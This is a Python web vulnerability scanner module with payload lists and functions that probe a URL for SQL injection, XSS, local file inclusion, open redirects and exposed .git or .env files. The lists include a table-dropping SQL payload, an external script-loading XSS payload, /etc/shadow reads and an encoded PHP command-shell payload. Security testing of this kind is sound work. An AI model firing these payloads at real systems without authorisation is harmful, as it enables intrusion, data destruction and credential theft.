"""
Vulnerability Scanner Module
Tests for common web vulnerabilities: SQLi, XSS, LFI, Open Redirect, etc.
"""
import re
import time
import urllib.parse

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# SQL Injection payloads
SQLI_PAYLOADS = [
    "'",
    "''",
    "`",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1 --",
    "' OR 1=1#",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
    "1; DROP TABLE users--",
    "1; SELECT SLEEP(3)--",
    "1' AND SLEEP(3)--",
    "' WAITFOR DELAY '0:0:3'--",
    "1 AND 1=1",
    "1 AND 1=2",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "admin'--",
    "admin'/*",
    "' OR 'x'='x",
    "\" OR \"x\"=\"x",
    "') OR ('x'='x",
    "1' UNION ALL SELECT NULL,NULL,NULL--",
]

# XSS Payloads
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "\"<script>alert(1)</script>",
    "'<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    "';alert('XSS')//",
    "\";alert('XSS')//",
    "<img src=\"javascript:alert('XSS')\">",
    "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
]

# LFI Payloads
LFI_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "%2F%2F%2Fetc%2Fpasswd",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+",
    "C:\\Windows\\system32\\drivers\\etc\\hosts",
    "C:\\boot.ini",
    "..\\..\\..\\Windows\\win.ini",
]

# Open Redirect Payloads
OPEN_REDIRECT_PAYLOADS = [
    "//evil.com",
    "https://evil.com",
    "http://evil.com",
    "//evil.com/path",
    "\/\/evil.com",
    "//evil.com/%2F..",
    "https:///evil.com",
    "javascript:alert(1)",
    "//google.com",
]

# Error patterns indicating vulnerabilities
SQL_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_.*",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"MySqlClient\.",
    r"MySQL Query fail.*",
    r"ERROR 1064",
    r"You have an error in your SQL syntax",
    r"supplied argument is not a valid MySQL",
    r"Column count doesn",
    r"PostgreSQL.*ERROR",
    r"Warning.*pg_.*",
    r"valid PostgreSQL result",
    r"Npgsql\.",
    r"org\.postgresql\.util\.PSQLException",
    r"org\.postgresql",
    r"ERROR: parser: parse error at or near",
    r"ORA-\d{4,5}",
    r"Oracle error",
    r"Oracle.*Driver",
    r"Warning.*oci_.*",
    r"OracleException",
    r"Microsoft OLE DB Provider for ODBC Drivers error",
    r"\[Microsoft\]\[ODBC",
    r"\[Macromedia\]\[SQLServer JDBC Driver\]",
    r"SQLServer JDBC Driver",
    r"com\.microsoft\.sqlserver\.jdbc",
    r"Microsoft SQL Native Client error",
    r"Unclosed quotation mark after the character string",
    r"SQLite.*error",
    r"SQLite\.Exception",
    r"System\.Data\.SQLite\.SQLiteException",
    r"Warning.*sqlite_.*",
    r"near \".*\": syntax error",
    r"SQLITE_ERROR",
]


def _get_session():
    """Create requests session"""
    if not HAS_REQUESTS:
        return None
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (compatible; Security Scanner/1.0)",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    })
    session.verify = False
    return session


def test_sqli(url, param=None, method="GET", callback=None):
    """Test for SQL injection vulnerabilities"""
    if not HAS_REQUESTS:
        return {"error": "requests library required"}

    results = {
        "url": url,
        "vulnerable": False,
        "findings": [],
        "payloads_tested": 0
    }

    if callback:
        callback({"type": "info", "message": f"💉 Testing SQL Injection on {url}..."})

    session = _get_session()
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)

    if not params and not param:
        if callback:
            callback({"type": "warn", "message": "⚠️  No parameters found in URL. Add ?param=value to test"})
        return results

    test_params = list(params.keys()) if params else [param]

    for test_param in test_params:
        if callback:
            callback({"type": "info", "message": f"  Testing parameter: {test_param}"})

        # Get baseline response
        try:
            baseline = session.get(url, timeout=10)
            baseline_len = len(baseline.text)
            baseline_time = baseline.elapsed.total_seconds()
        except:
            continue

        for payload in SQLI_PAYLOADS[:15]:  # Limit to first 15 for speed
            results["payloads_tested"] += 1
            test_url = url.split('?')[0]
            test_params_dict = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
            test_params_dict[test_param] = payload

            try:
                start_time = time.time()
                resp = session.get(test_url, params=test_params_dict, timeout=15)
                elapsed = time.time() - start_time

                # Check for SQL errors
                for pattern in SQL_ERROR_PATTERNS:
                    if re.search(pattern, resp.text, re.IGNORECASE):
                        finding = {
                            "type": "Error-based SQLi",
                            "param": test_param,
                            "payload": payload,
                            "pattern": pattern,
                            "severity": "critical"
                        }
                        results["findings"].append(finding)
                        results["vulnerable"] = True
                        if callback:
                            callback({"type": "vuln", "message": f"🚨 SQL INJECTION FOUND! Param: {test_param} | Type: Error-based"})
                            callback({"type": "vuln", "message": f"   Payload: {payload}"})
                        break

                # Time-based blind SQLi
                if "SLEEP" in payload.upper() or "WAITFOR" in payload.upper() or "DELAY" in payload.upper():
                    if elapsed > 2.5:
                        finding = {
                            "type": "Time-based Blind SQLi",
                            "param": test_param,
                            "payload": payload,
                            "elapsed": elapsed,
                            "severity": "critical"
                        }
                        results["findings"].append(finding)
                        results["vulnerable"] = True
                        if callback:
                            callback({"type": "vuln", "message": f"🚨 TIME-BASED SQLi FOUND! Param: {test_param} | Delay: {elapsed:.1f}s"})

            except requests.Timeout:
                # Possible time-based blind
                if "SLEEP" in payload.upper() or "WAITFOR" in payload.upper():
                    if callback:
                        callback({"type": "warn", "message": f"⚠️  Timeout with time-based payload on {test_param} - possible blind SQLi"})
            except Exception:
                pass

    if not results["vulnerable"] and callback:
        callback({"type": "ok", "message": f"✅ No SQL injection found ({results['payloads_tested']} payloads tested)"})

    return results


def test_xss(url, param=None, callback=None):
    """Test for Cross-Site Scripting (XSS) vulnerabilities"""
    if not HAS_REQUESTS:
        return {"error": "requests library required"}

    results = {
        "url": url,
        "vulnerable": False,
        "findings": [],
        "payloads_tested": 0
    }

    if callback:
        callback({"type": "info", "message": f"🎯 Testing XSS on {url}..."})

    session = _get_session()
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)

    if not params and not param:
        if callback:
            callback({"type": "warn", "message": "⚠️  No parameters found in URL"})
        return results

    test_params = list(params.keys()) if params else [param]

    for test_param in test_params:
        for payload in XSS_PAYLOADS[:10]:
            results["payloads_tested"] += 1
            test_url = url.split('?')[0]
            test_params_dict = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
            test_params_dict[test_param] = payload

            try:
                resp = session.get(test_url, params=test_params_dict, timeout=10)

                # Check if payload is reflected unencoded
                if payload in resp.text and payload not in ["<", ">", "\"", "'"]:
                    # Check it's not HTML-encoded
                    encoded_payload = payload.replace('<', '&lt;').replace('>', '&gt;')
                    if encoded_payload not in resp.text:
                        finding = {
                            "type": "Reflected XSS",
                            "param": test_param,
                            "payload": payload,
                            "severity": "high"
                        }
                        results["findings"].append(finding)
                        results["vulnerable"] = True
                        if callback:
                            callback({"type": "vuln", "message": f"🚨 XSS FOUND! Param: {test_param}"})
                            callback({"type": "vuln", "message": f"   Payload: {payload}"})
                        break

            except Exception:
                pass

    if not results["vulnerable"] and callback:
        callback({"type": "ok", "message": f"✅ No XSS found ({results['payloads_tested']} payloads tested)"})

    return results


def test_lfi(url, param=None, callback=None):
    """Test for Local File Inclusion vulnerabilities"""
    if not HAS_REQUESTS:
        return {"error": "requests library required"}

    results = {
        "url": url,
        "vulnerable": False,
        "findings": []
    }

    if callback:
        callback({"type": "info", "message": f"📂 Testing LFI on {url}..."})

    session = _get_session()
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)

    if not params and not param:
        if callback:
            callback({"type": "warn", "message": "⚠️  No parameters found. Typical params: file=, page=, include="})
        return results

    lfi_indicators = [
        "root:x:", "root:!", "[boot loader]", "[extensions]",
        "localhost", "/bin/bash", "daemon:", "www-data",
        "DOCUMENT_ROOT=", "PHP_SELF=", "SCRIPT_FILENAME="
    ]

    test_params_keys = list(params.keys()) if params else [param]

    for test_param in test_params_keys:
        for payload in LFI_PAYLOADS[:10]:
            test_url = url.split('?')[0]
            test_p = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
            test_p[test_param] = payload

            try:
                resp = session.get(test_url, params=test_p, timeout=10)
                for indicator in lfi_indicators:
                    if indicator in resp.text:
                        finding = {
                            "type": "Local File Inclusion",
                            "param": test_param,
                            "payload": payload,
                            "indicator": indicator,
                            "severity": "critical"
                        }
                        results["findings"].append(finding)
                        results["vulnerable"] = True
                        if callback:
                            callback({"type": "vuln", "message": f"🚨 LFI FOUND! Param: {test_param} | File content detected"})
                        break
            except Exception:
                pass

    if not results["vulnerable"] and callback:
        callback({"type": "ok", "message": "✅ No LFI detected"})

    return results


def test_open_redirect(url, param=None, callback=None):
    """Test for Open Redirect vulnerabilities"""
    if not HAS_REQUESTS:
        return {"error": "requests library required"}

    results = {"url": url, "vulnerable": False, "findings": []}

    if callback:
        callback({"type": "info", "message": f"🔀 Testing Open Redirect on {url}..."})

    session = _get_session()
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)

    # Look for redirect params
    redirect_params = [k for k in params.keys() if any(r in k.lower() for r in
                       ["redirect", "url", "next", "return", "goto", "dest", "destination", "forward", "redir", "back"])]
    if param:
        redirect_params = [param]
    if not redirect_params:
        redirect_params = list(params.keys())

    for test_param in redirect_params:
        for payload in OPEN_REDIRECT_PAYLOADS:
            test_p = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
            test_p[test_param] = payload

            try:
                resp = session.get(url.split('?')[0], params=test_p, timeout=10, allow_redirects=False)

                location = resp.headers.get("Location", "")
                if location and ("evil.com" in location or "google.com" in location):
                    finding = {
                        "type": "Open Redirect",
                        "param": test_param,
                        "payload": payload,
                        "redirect_to": location,
                        "severity": "medium"
                    }
                    results["findings"].append(finding)
                    results["vulnerable"] = True
                    if callback:
                        callback({"type": "vuln", "message": f"⚠️  Open Redirect! Param: {test_param} → {location}"})
            except Exception:
                pass

    if not results["vulnerable"] and callback:
        callback({"type": "ok", "message": "✅ No open redirect detected"})

    return results


def check_security_misconfigs(url, callback=None):
    """Check for common security misconfigurations"""
    if not HAS_REQUESTS:
        return {"error": "requests library required"}

    findings = []
    session = _get_session()
    base = url.rstrip('/')

    if callback:
        callback({"type": "info", "message": f"🔍 Checking security misconfigurations on {url}..."})

    # Check HTTP methods
    try:
        for method in ["OPTIONS", "TRACE", "PUT", "DELETE"]:
            resp = session.request(method, base, timeout=5)
            if resp.status_code not in [404, 405, 501]:
                if method == "TRACE":
                    findings.append({"type": f"HTTP {method} enabled", "severity": "medium",
                                   "detail": f"TRACE method may allow XST attacks"})
                    if callback:
                        callback({"type": "vuln", "message": f"⚠️  HTTP TRACE enabled (XST risk)"})
                elif method in ["PUT", "DELETE"]:
                    findings.append({"type": f"HTTP {method} enabled", "severity": "high",
                                   "detail": f"{method} method could allow file upload/deletion"})
                    if callback:
                        callback({"type": "vuln", "message": f"🚨 HTTP {method} enabled! (status: {resp.status_code})"})
    except Exception:
        pass

    # Check for directory listing
    test_dirs = ["/images/", "/uploads/", "/files/", "/static/", "/css/", "/js/"]
    for d in test_dirs:
        try:
            resp = session.get(base + d, timeout=5)
            if resp.status_code == 200 and (
                "Index of" in resp.text or
                "Directory listing" in resp.text or
                "<title>Index of" in resp.text
            ):
                findings.append({"type": "Directory Listing", "severity": "medium",
                                "detail": f"Directory listing enabled at {d}"})
                if callback:
                    callback({"type": "vuln", "message": f"⚠️  Directory listing at {base + d}"})
        except Exception:
            pass

    # Check for exposed .git
    try:
        resp = session.get(base + "/.git/config", timeout=5)
        if resp.status_code == 200 and "[core]" in resp.text:
            findings.append({"type": "Exposed .git", "severity": "critical",
                            "detail": ".git directory publicly accessible - source code exposure!"})
            if callback:
                callback({"type": "vuln", "message": "🚨 CRITICAL: .git directory exposed!"})
    except Exception:
        pass

    # Check for exposed .env
    try:
        resp = session.get(base + "/.env", timeout=5)
        if resp.status_code == 200 and ("=" in resp.text or "DB_" in resp.text):
            findings.append({"type": "Exposed .env", "severity": "critical",
                            "detail": ".env file exposed - credentials may be leaked!"})
            if callback:
                callback({"type": "vuln", "message": "🚨 CRITICAL: .env file exposed!"})
    except Exception:
        pass

    if not findings and callback:
        callback({"type": "ok", "message": "✅ No obvious misconfigurations found"})

    return {"findings": findings, "count": len(findings)}
